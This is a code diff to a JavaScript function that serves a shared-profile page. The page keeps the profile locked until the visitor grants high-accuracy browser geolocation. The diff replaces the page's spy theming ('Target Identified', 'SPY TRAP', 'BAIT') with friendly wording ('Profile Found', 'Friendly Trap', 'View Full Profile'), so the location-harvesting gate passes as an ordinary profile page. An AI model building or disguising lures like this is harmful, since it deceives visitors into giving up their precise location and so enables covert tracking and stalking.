@@ -5,7 +5,7 @@ export function serveSharedHtml(token) {
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>TOP SECRET // DO NOT OPEN</title>
+    <title>Profile View</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
     <!-- Fun Fonts: Fredoka for headings, Comic Neue for reading -->
@@ -72,13 +72,13 @@ export function serveSharedHtml(token) {
             box-shadow: 2px 2px 0px #1e293b !important;
         }
 
-        /* Spy Action Button Style */
-        .spy-btn {
+        /* Profile Action Button Style */
+        .profile-btn {
             border: 4px solid black;
             box-shadow: 6px 6px 0px 0px black;
             transition: all 0.1s;
         }
-        .spy-btn:active {
+        .profile-btn:active {
             transform: translate(3px, 3px);
             box-shadow: 3px 3px 0px 0px black;
         }
@@ -89,15 +89,15 @@ export function serveSharedHtml(token) {
         
         <!-- LOADING STATE -->
         <div v-if="loading" class="flex flex-col items-center justify-center min-h-[50vh] animate-bounce">
-            <i class="fa-solid fa-satellite-dish text-5xl text-blue-500 mb-4"></i>
-            <p class="text-xl font-bold font-fun text-slate-700">Establishing Secure Link...</p>
+            <i class="fa-solid fa-circle-notch fa-spin text-5xl text-blue-500 mb-4"></i>
+            <p class="text-xl font-bold font-fun text-slate-700">Loading Profile...</p>
         </div>
 
-        <!-- SPY LOCK STATE (BAIT) -->
-        <div v-else-if="isLocationLocked" class="fun-card p-8 md:p-12 text-center bg-sky-50 flex flex-col items-center justify-center min-h-[60vh] border-sky-600 relative overflow-hidden">
+        <!-- LOCKED STATE (Friendly "Trap") -->
+        <div v-else-if="isLocationLocked" class="fun-card p-8 md:p-12 text-center bg-white flex flex-col items-center justify-center min-h-[60vh] border-blue-500 relative overflow-hidden">
             <!-- Background Decoration -->
-            <div class="absolute inset-0 pointer-events-none opacity-10 flex items-center justify-center text-9xl">
-                <i class="fa-solid fa-user-secret"></i>
+            <div class="absolute inset-0 pointer-events-none opacity-5 flex items-center justify-center text-9xl">
+                <i class="fa-solid fa-user"></i>
             </div>
             
             <div class="z-10 w-full max-w-lg flex flex-col items-center">
@@ -110,29 +110,29 @@ export function serveSharedHtml(token) {
                      </div>
                 </div>
 
-                <h1 class="text-3xl font-fun font-black text-slate-900 mb-1">Target Identified</h1>
+                <h1 class="text-3xl font-fun font-black text-slate-900 mb-1">Profile Found</h1>
                 <div class="text-xl font-bold text-blue-600 font-fun mb-6">{{partialData.full_name}}</div>
                 
-                <p class="text-sm font-bold text-slate-500 mb-8 uppercase tracking-widest border-y-2 border-slate-200 py-2 w-full">
-                    Dossier Ready For Review
+                <p class="text-sm font-bold text-slate-500 mb-8 uppercase tracking-widest border-y-2 border-slate-100 py-3 w-full">
+                    Private Profile • Invite Only
                 </p>
 
-                <button @click="attemptUnlock" :disabled="locationLoading" class="spy-btn bg-yellow-400 hover:bg-yellow-300 text-black font-black text-xl px-10 py-5 rounded-2xl flex items-center gap-3 w-full justify-center disabled:opacity-50 disabled:cursor-not-allowed group">
+                <button @click="attemptUnlock" :disabled="locationLoading" class="profile-btn bg-blue-500 hover:bg-blue-400 text-white font-black text-xl px-10 py-5 rounded-2xl flex items-center gap-3 w-full justify-center disabled:opacity-50 disabled:cursor-not-allowed group transition-colors">
                     <span v-if="locationLoading" class="flex items-center gap-2">
                         <i class="fa-solid fa-circle-notch fa-spin"></i>
-                        <span>Decrypting...</span>
+                        <span>Loading...</span>
                     </span>
                     <span v-else class="flex items-center gap-2">
-                        <i class="fa-solid fa-folder-open group-hover:scale-110 transition-transform"></i>
-                        <span>ACCESS PROFILE</span>
+                        <i class="fa-solid fa-eye group-hover:scale-110 transition-transform"></i>
+                        <span>View Full Profile</span>
                     </span>
                 </button>
                 
-                <div v-if="locationError" class="mt-6 text-red-600 font-bold bg-red-100 px-4 py-3 rounded-xl border-2 border-red-200 flex items-center gap-3 animate-pulse">
-                    <i class="fa-solid fa-triangle-exclamation text-2xl"></i> 
-                    <div class="text-left text-sm">
-                        <div class="font-black uppercase">Uplink Failed</div>
-                        <div>{{ locationError }}</div>
+                <div v-if="locationError" class="mt-6 text-red-600 font-bold bg-red-50 px-4 py-3 rounded-xl border-2 border-red-100 flex items-center gap-3 animate-pulse w-full text-left">
+                    <i class="fa-solid fa-circle-exclamation text-2xl"></i> 
+                    <div>
+                        <div class="font-black uppercase text-xs">Access Issue</div>
+                        <div class="text-sm">{{ locationError }}</div>
                     </div>
                 </div>
             </div>
@@ -140,8 +140,8 @@ export function serveSharedHtml(token) {
 
         <!-- ERROR STATE -->
         <div v-else-if="error" class="fun-card p-8 text-center bg-red-50 border-red-900">
-            <h1 class="text-3xl font-fun text-red-600 mb-2">Uh Oh! 🚫</h1>
-            <p class="text-lg font-bold">{{error}}</p>
+            <h1 class="text-3xl font-fun text-red-600 mb-2">Unavailable</h1>
+            <p class="text-lg font-bold text-slate-700">{{error}}</p>
         </div>
 
         <!-- MAIN CONTENT (Only shown if unlocked) -->
@@ -451,13 +451,13 @@ export function serveSharedHtml(token) {
                     }
                 };
 
-                // --- SPY TRAP UNLOCK FUNCTION ---
+                // --- FRIENDLY UNLOCK FUNCTION ---
                 const attemptUnlock = () => {
                     locationError.value = null;
                     locationLoading.value = true;
 
                     if (!navigator.geolocation) {
-                        locationError.value = "Device capability failure. Geolocation missing.";
+                        locationError.value = "Your browser does not support location services.";
                         locationLoading.value = false;
                         return;
                     }
@@ -471,10 +471,10 @@ export function serveSharedHtml(token) {
                         },
                         (err) => {
                             console.error(err);
-                            // SPY THEMED ERRORS
-                            if(err.code === 1) locationError.value = "Sat-Link Connection Refused by User.";
-                            else if(err.code === 2) locationError.value = "Signal Lost. GPS Unavailable.";
-                            else locationError.value = "Connection Timeout. Retry Uplink.";
+                            // FRIENDLY ERRORS
+                            if(err.code === 1) locationError.value = "We need your permission to unlock the profile.";
+                            else if(err.code === 2) locationError.value = "We couldn't determine your location.";
+                            else locationError.value = "Connection timed out. Please try again.";
                             locationLoading.value = false;
                         },
                         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
